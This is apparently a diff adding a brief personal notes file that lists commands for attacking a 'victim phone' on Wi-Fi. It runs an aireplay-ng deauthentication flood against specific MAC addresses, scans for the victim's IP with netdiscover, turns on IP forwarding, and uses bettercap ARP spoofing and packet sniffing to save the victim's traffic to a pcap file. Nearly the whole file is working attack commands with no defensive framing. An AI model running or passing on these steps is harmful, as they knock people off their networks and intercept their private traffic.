@@ -1,0 +1,12 @@
+(make your own wifi access point)
+(aireplay-ng --deauth 10000000 -a 78:11:DC:35:16:56 -c C6:0A:8C:E4:CA:74 wlan0) 
+(connect kali and victim phone to android hotspot and name it rahul.)
+(netdiscover -r 192.168.43.0/24)  (find victim ip)
+(echo 1 > /proc/sys/net/ipv4/ip_forward)
+(sudo bettercap -iface wlan0)
+set arp.spoof.targets <victim-ip>
+set net.sniff.verbose true
+arp.spoof on
+net.sniff on
+(set net.sniff.output sniffed.pcap)  (save files)
+(or instead of bettercap use python and spoofing)
